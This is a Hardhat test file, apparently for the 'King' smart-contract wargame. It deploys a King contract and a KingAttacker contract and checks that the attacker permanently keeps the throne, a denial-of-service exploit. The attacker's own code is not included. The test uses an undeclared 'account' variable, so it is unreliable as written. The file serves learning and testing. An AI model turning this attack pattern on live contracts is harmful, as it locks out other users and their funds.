const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("King Attack", async function () {
  it("should have attacker remain the king", async function () {
    const value = ethers.utils.parseEther("0.001");

    // Deploy the king smart contract
    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({ value: value });

    const firstKing = await king._king();

    // Deploy the kingAttacker smart contract
    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.deploy(king.address);

    const afterAttackKing = await king._king();
    expect(afterAttackKing).to.be.equal(kingAttacker.address);
    expect(afterAttackKing).to.not.be.equal(firstKing);

    const transaction = await account.sendTransaction({
      to: king.address,
      value: value,
    });
    await transaction.wait();

    const finalKing = await king._king();
    expect(finalKing).to.be.equal(afterAttackKing);
  });
});
